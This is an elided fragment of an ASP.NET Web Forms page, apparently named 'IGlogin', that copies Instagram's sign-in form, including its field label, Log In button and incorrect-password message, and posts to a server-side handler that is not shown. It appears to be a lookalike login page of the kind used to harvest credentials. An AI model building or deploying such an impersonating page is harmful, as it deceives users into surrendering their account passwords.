<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="WebForm1.aspx.cs" Inherits="IGlogin.WebForm1" %>
...
<body>
                            ...
                            <div class="signin-form" id="signin-form">
                                <div class="form-group">
                                    <div class="animate-input">
                                        <span>Phone number, username or email
                                        </span>
                                        <asp:TextBox runat="server" ID="Uname2"></asp:TextBox>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="animate-input">
                                        ...
                                        <asp:TextBox runat="server" ID="Pword2"></asp:TextBox>
                                ...
                                <div class="btn-group">
                                    ...
                                    <asp:Button CssClass="btn-login" runat="server" ID="LogInBtn" OnClick="sbmt_Click" Text="Log In" />
                                ...
                                <div>
                                    <a id="inc2" style="color: red">
                                        <asp:Label runat="server" Visible="false" ID="inc">Sorry, your password was incorrect. Please double-check your password.</asp:Label></a>
                                </div>
    ...
    <!-- APP JS -->
    <script>let slide_content = document.querySelector('#slide-content')
